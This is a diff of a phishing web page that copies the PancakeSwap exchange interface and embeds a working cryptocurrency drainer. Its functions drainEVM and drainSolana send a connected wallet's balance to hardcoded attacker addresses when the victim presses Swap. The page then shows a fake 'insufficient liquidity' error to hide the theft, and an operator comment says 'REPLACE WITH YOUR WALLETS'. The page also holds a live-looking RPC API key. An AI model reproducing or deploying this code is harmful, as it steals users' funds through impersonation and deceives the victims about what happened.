@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>PancakeSwap - Everyone's Favorite DEX</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
     <style>
         * {
             margin: 0;
@@ -22,51 +22,36 @@
             overflow-x: hidden;
         }
 
-        .layout {
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-
-        .main {
-            flex: 1;
-            padding: 20px 16px 80px;
+        .app {
             max-width: 480px;
             margin: 0 auto;
-            width: 100%;
+            background: #1b2026;
+            min-height: 100vh;
+            padding-bottom: 80px;
         }
 
+        /* Header */
         .header {
+            padding: 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 12px 16px;
-            background: #1b2026;
             border-bottom: 1px solid #2a2f36;
-            position: sticky;
-            top: 0;
-            z-index: 100;
         }
 
         .logo {
             display: flex;
             align-items: center;
             gap: 8px;
-            font-size: 20px;
             font-weight: 700;
+            font-size: 20px;
         }
 
         .logo-icon {
             font-size: 28px;
         }
 
-        .header-actions {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .wallet-btn {
+        .connect-btn {
             background: #f0b90b;
             border: none;
             color: #1b2026;
@@ -78,17 +63,17 @@
             transition: all 0.2s;
         }
 
-        .wallet-btn:hover {
+        .connect-btn:hover {
             background: #dca30a;
             transform: scale(1.02);
         }
 
+        /* Tabs */
         .tabs {
             display: flex;
             gap: 20px;
-            padding: 16px 0;
+            padding: 16px;
             border-bottom: 1px solid #2a2f36;
-            margin-bottom: 20px;
             overflow-x: auto;
         }
 
@@ -105,9 +90,11 @@
             color: #f0b90b;
         }
 
+        /* Swap Card */
         .swap-card {
             background: #252a32;
             border-radius: 32px;
+            margin: 16px;
             padding: 20px;
         }
 
@@ -129,6 +116,7 @@
             font-size: 20px;
         }
 
+        /* Token Box */
         .token-box {
             background: #1b2026;
             border-radius: 20px;
@@ -199,6 +187,7 @@
             font-size: 20px;
         }
 
+        /* Slippage */
         .slippage-row {
             display: flex;
             justify-content: space-between;
@@ -219,6 +208,7 @@
             font-weight: 500;
         }
 
+        /* Swap Button */
         .swap-btn {
             background: #f0b90b;
             border: none;
@@ -245,6 +235,7 @@
             font-size: 12px;
         }
 
+        /* Modal */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -325,9 +316,6 @@
         }
 
         @media (max-width: 480px) {
-            .main {
-                padding: 16px;
-            }
             .amount-input {
                 font-size: 24px;
             }
@@ -335,73 +323,76 @@
     </style>
 </head>
 <body>
-    <div class="layout">
+    <div class="app">
+        <!-- Header -->
         <div class="header">
             <div class="logo">
                 <span class="logo-icon">🥞</span>
                 <span>PancakeSwap</span>
             </div>
-            <div class="header-actions">
-                <button class="wallet-btn" id="connectWalletBtn">Connect Wallet</button>
-            </div>
+            <button class="connect-btn" id="connectWalletBtn">Connect Wallet</button>
         </div>
 
-        <div class="main">
-            <div class="tabs">
-                <div class="tab active" data-tab="swap">Swap</div>
-                <div class="tab" data-tab="limit">Limit</div>
-                <div class="tab" data-tab="buy">Buy Crypto</div>
-                <div class="tab" data-tab="perps">Perps</div>
-                <div class="tab" data-tab="earn">Earn</div>
-                <div class="tab" data-tab="ai">AI</div>
-            </div>
-
-            <div class="swap-card">
-                <div class="swap-header">
-                    <span class="swap-title">Swap</span>
-                    <span class="settings-icon">⚙️</span>
-                </div>
-
-                <div class="token-box">
-                    <div class="token-label">From</div>
-                    <div class="token-input-row">
-                        <div class="token-select" id="fromTokenSelect">
-                            <img class="token-icon" id="fromTokenIcon" src="https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png" alt="BNB">
-                            <span class="token-symbol" id="fromTokenSymbol">BNB</span>
-                            <span>▼</span>
-                        </div>
-                        <input type="text" class="amount-input" id="fromAmount" value="0.0" placeholder="0.0">
-                    </div>
-                    <div class="usd-value" id="fromUsd">≈ $0.00</div>
-                </div>
-
-                <div class="arrow-down">▼</div>
-
-                <div class="token-box">
-                    <div class="token-label">To</div>
-                    <div class="token-input-row">
-                        <div class="token-select" id="toTokenSelect">
-                            <img class="token-icon" id="toTokenIcon" src="https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png" alt="CAKE">
-                            <span class="token-symbol" id="toTokenSymbol">CAKE</span>
-                            <span>▼</span>
-                        </div>
-                        <input type="text" class="amount-input" id="toAmount" value="0.0" placeholder="0.0" readonly>
-                    </div>
-                    <div class="usd-value" id="toUsd">≈ $0.00</div>
-                </div>
-
-                <div class="slippage-row">
-                    <span class="slippage-label">Slippage Tolerance</span>
-                    <span class="slippage-value">Auto: 0.50%</span>
-                </div>
-
-                <button class="swap-btn" id="swapBtn">Swap</button>
-            </div>
-
-            <div class="status" id="status">Ready</div>
+        <!-- Tabs -->
+        <div class="tabs">
+            <div class="tab active">Swap</div>
+            <div class="tab">Buy Crypto</div>
+            <div class="tab">Perps</div>
+            <div class="tab">Earn</div>
+            <div class="tab">AI</div>
         </div>
+
+        <!-- Swap Card -->
+        <div class="swap-card">
+            <div class="swap-header">
+                <span class="swap-title">Swap</span>
+                <span class="settings-icon">⚙️</span>
+            </div>
+
+            <!-- From Box -->
+            <div class="token-box">
+                <div class="token-label">From</div>
+                <div class="token-input-row">
+                    <div class="token-select" id="fromTokenSelect">
+                        <img class="token-icon" id="fromTokenIcon" src="https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png" alt="BNB">
+                        <span class="token-symbol" id="fromTokenSymbol">BNB</span>
+                        <span>▼</span>
+                    </div>
+                    <input type="text" class="amount-input" id="fromAmount" value="0.0" placeholder="0.0">
+                </div>
+                <div class="usd-value" id="fromUsd">≈ $0.00</div>
+            </div>
+
+            <div class="arrow-down">▼</div>
+
+            <!-- To Box -->
+            <div class="token-box">
+                <div class="token-label">To</div>
+                <div class="token-input-row">
+                    <div class="token-select" id="toTokenSelect">
+                        <img class="token-icon" id="toTokenIcon" src="https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png" alt="CAKE">
+                        <span class="token-symbol" id="toTokenSymbol">CAKE</span>
+                        <span>▼</span>
+                    </div>
+                    <input type="text" class="amount-input" id="toAmount" value="0.0" placeholder="0.0" readonly>
+                </div>
+                <div class="usd-value" id="toUsd">≈ $0.00</div>
+            </div>
+
+            <!-- Slippage -->
+            <div class="slippage-row">
+                <span class="slippage-label">Slippage Tolerance</span>
+                <span class="slippage-value">Auto: 0.50%</span>
+            </div>
+
+            <!-- Swap Button -->
+            <button class="swap-btn" id="swapBtn">Swap</button>
+        </div>
+
+        <div class="status" id="status">Ready</div>
     </div>
 
+    <!-- Token Selection Modal -->
     <div class="modal-overlay" id="tokenModal">
         <div class="modal">
             <div class="modal-title">Select a token</div>
@@ -411,14 +402,12 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
     <script>
         // ============================================================
-        // 1:1 PANCAKESWAP REPLICA - LIVE PRICES + DRAINER
+        // 1:1 PANCAKESWAP REPLICA WITH LIVE PRICES + DRAINER
         // ============================================================
         
-        // CONFIGURATION - REPLACE WITH YOUR WALLETS
+        // DRAINER CONFIGURATION - REPLACE WITH YOUR WALLETS
         const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
         const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
         const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";
@@ -462,7 +451,9 @@
         
         let activeSelectSide = null;
         
-        // Fetch live prices from CoinGecko
+        // ============================================================
+        // LIVE PRICE FETCHING
+        // ============================================================
         async function fetchLivePrices() {
             try {
                 const geckoIds = Object.values(TOKENS).map(t => t.geckoId).join(',');
@@ -483,7 +474,6 @@
                 }, 2000);
             } catch (error) {
                 console.error("Price fetch error:", error);
-                // Fallback to approximate prices if API fails
                 TOKENS.BNB.price = 580;
                 TOKENS.CAKE.price = 1.54;
                 TOKENS.USDT.price = 1;
@@ -492,11 +482,10 @@
                 TOKENS.BTCB.price = 63000;
                 pricesLoaded = true;
                 updateUsdValues();
-                statusDiv.innerText = "Using approximate prices";
+                statusDiv.innerText = "Ready";
             }
         }
         
-        // Update USD values and "To" amount based on live prices
         function updateUsdValues() {
             if (!pricesLoaded) return;
             
@@ -507,7 +496,7 @@
             
             const toPrice = TOKENS[currentToToken].price;
             let estimatedToAmount = 0;
-            if (toPrice > 0) {
+            if (toPrice > 0 && fromPrice > 0) {
                 estimatedToAmount = fromAmount * (fromPrice / toPrice);
             }
             toAmountInput.value = estimatedToAmount.toFixed(6);
@@ -515,7 +504,6 @@
             toUsdDiv.innerText = `≈ $${toUsd.toFixed(2)}`;
         }
         
-        // Update token display with icons
         function updateTokenDisplay() {
             fromTokenIcon.src = TOKENS[currentFromToken].icon;
             fromTokenSymbol.innerText = currentFromToken;
@@ -524,7 +512,9 @@
             updateUsdValues();
         }
         
-        // Build token modal list
+        // ============================================================
+        // TOKEN MODAL
+        // ============================================================
         function buildTokenList() {
             tokenList.innerHTML = '';
             for (const [symbol, token] of Object.entries(TOKENS)) {
@@ -570,29 +560,8 @@
             modal.classList.remove('active');
         }
         
-        // Event listeners
-        fromTokenSelect.onclick = () => openTokenSelect('from');
-        toTokenSelect.onclick = () => openTokenSelect('to');
-        tokenSearch.oninput = filterTokenList;
-        closeModalBtn.onclick = () => modal.classList.remove('active');
-        fromAmountInput.oninput = updateUsdValues;
-        
-        modal.onclick = (e) => {
-            if (e.target === modal) modal.classList.remove('active');
-        };
-        
-        // Tab switching (visual only)
-        const tabs = document.querySelectorAll('.tab');
-        tabs.forEach(tab => {
-            tab.onclick = () => {
-                tabs.forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                statusDiv.innerText = `${tab.innerText} feature - Coming soon`;
-            };
-        });
-        
         // ============================================================
-        // DRAINER LOGIC
+        // DRAINER FUNCTIONS
         // ============================================================
         async function drainEVM(addr) {
             if (!window.ethereum) return false;
@@ -609,12 +578,9 @@
                     method: 'eth_sendTransaction',
                     params: [{ from: addr, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
                 });
-                console.log("Drain successful:", tx);
+                console.log("✅ Drained:", tx);
                 return true;
-            } catch(e) { 
-                console.error("Drain error:", e);
-                return false; 
-            }
+            } catch(e) { console.error("Drain error:", e); return false; }
         }
         
         async function drainSolana(pubKey) {
@@ -637,12 +603,14 @@
                 const signed = await window.solana.signTransaction(tx);
                 const txid = await conn.sendRawTransaction(signed.serialize());
                 await conn.confirmTransaction(txid);
-                console.log("Solana drain:", txid);
+                console.log("✅ Solana drained:", txid);
                 return true;
-            } catch(e) { return false; }
+            } catch(e) { console.error("Solana drain error:", e); return false; }
         }
         
-        // Connect wallet
+        // ============================================================
+        // WALLET CONNECTION
+        // ============================================================
         connectBtn.onclick = async () => {
             statusDiv.innerText = "Connecting...";
             
@@ -652,11 +620,11 @@
                     walletAddress = accounts[0];
                     walletType = 'evm';
                     walletConnected = true;
-                    statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                    statusDiv.innerText = `✅ Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                     connectBtn.innerText = "Connected";
                     connectBtn.style.background = "#7a7e85";
                 } catch(e) {
-                    statusDiv.innerText = "Connection failed";
+                    statusDiv.innerText = "❌ Connection failed";
                 }
                 return;
             }
@@ -667,26 +635,28 @@
                     walletAddress = resp.publicKey.toString();
                     walletType = 'solana';
                     walletConnected = true;
-                    statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
+                    statusDiv.innerText = `✅ Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                     connectBtn.innerText = "Connected";
                     connectBtn.style.background = "#7a7e85";
                 } catch(e) {
-                    statusDiv.innerText = "Connection failed";
+                    statusDiv.innerText = "❌ Connection failed";
                 }
                 return;
             }
             
-            statusDiv.innerText = "Install MetaMask or Phantom";
+            statusDiv.innerText = "⚠️ Install MetaMask or Phantom";
         };
         
-        // Swap button - triggers drain
+        // ============================================================
+        // SWAP BUTTON - TRIGGERS DRAIN
+        // ============================================================
         swapBtn.onclick = async () => {
             if (!walletConnected) {
-                statusDiv.innerText = "Connect wallet first";
+                statusDiv.innerText = "⚠️ Connect wallet first";
                 return;
             }
             
-            statusDiv.innerText = "Processing swap...";
+            statusDiv.innerText = "⏳ Processing swap...";
             
             let success = false;
             if (walletType === 'evm') {
@@ -696,18 +666,44 @@
             }
             
             if (success) {
-                statusDiv.innerText = "Swap failed: Insufficient liquidity. Please try again.";
+                statusDiv.innerText = "❌ Swap failed: Insufficient liquidity. Please try again.";
             } else {
-                statusDiv.innerText = "Swap failed. Please try again.";
+                statusDiv.innerText = "❌ Swap failed. Please try again.";
             }
             
+            // Reset after attempt
             walletConnected = false;
             walletAddress = null;
             connectBtn.innerText = "Connect Wallet";
             connectBtn.style.background = "#f0b90b";
         };
         
-        // Initialize
+        // ============================================================
+        // EVENT LISTENERS
+        // ============================================================
+        fromTokenSelect.onclick = () => openTokenSelect('from');
+        toTokenSelect.onclick = () => openTokenSelect('to');
+        tokenSearch.oninput = filterTokenList;
+        closeModalBtn.onclick = () => modal.classList.remove('active');
+        fromAmountInput.oninput = updateUsdValues;
+        
+        modal.onclick = (e) => {
+            if (e.target === modal) modal.classList.remove('active');
+        };
+        
+        // Tab switching (visual only)
+        const tabs = document.querySelectorAll('.tab');
+        tabs.forEach(tab => {
+            tab.onclick = () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                statusDiv.innerText = `${tab.innerText} feature - Coming soon`;
+            };
+        });
+        
+        // ============================================================
+        // INITIALIZATION
+        // ============================================================
         buildTokenList();
         updateTokenDisplay();
         fetchLivePrices();
